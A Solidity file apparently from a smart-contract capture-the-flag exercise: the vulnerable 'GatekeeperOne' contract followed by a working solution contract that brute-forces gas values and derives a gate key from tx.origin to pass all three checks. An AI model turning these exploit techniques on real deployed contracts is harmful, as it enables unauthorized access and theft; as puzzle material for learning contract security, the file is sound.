// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


// solution
contract HackGatekeeperOne {
  /**
   * Gate 1 : call the contract from another contract
   * Gate 2 : gasleft() % 8191 == 0 
   * Gate 3 : calculat the key
  */
  constructor( address ctrAddr) {
    bytes8 k = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);
    for (uint256 i = 200; i <= 500; i++) {
      (bool success, ) = address(ctrAddr).call{gas: (i + 8191*3)}(abi.encodeWithSignature(("enter(bytes8)"), k));
      if (success) {
        break;
      }
    }
  }
}

